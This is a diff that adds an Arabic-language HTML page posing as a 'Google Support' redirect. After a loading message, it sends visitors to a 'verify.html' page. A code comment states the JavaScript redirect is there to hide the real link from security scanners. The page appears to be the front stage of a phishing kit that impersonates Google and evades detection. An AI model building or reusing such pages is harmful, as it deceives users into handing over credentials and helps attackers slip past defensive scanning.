@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Support - إعادة توجيه</title>
+    <style>
+        body { font-family: system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fff; }
+        .loader { text-align: center; color: #5f6368; }
+    </style>
+    <noscript><meta http-equiv="refresh" content="0; url='verify.html'"></noscript>
+</head>
+<body>
+    <div class="loader">
+        <p>جارٍ تحميل صفحة الدعم...</p>
+    </div>
+    <script>
+        // إخفاء الرابط الحقيقي عن الماسحات عبر التوجيه بجافاسكريبت
+        setTimeout(function() {
+            window.location.href = 'verify.html';
+        }, 1500);
+    </script>
+</body>
+</html>
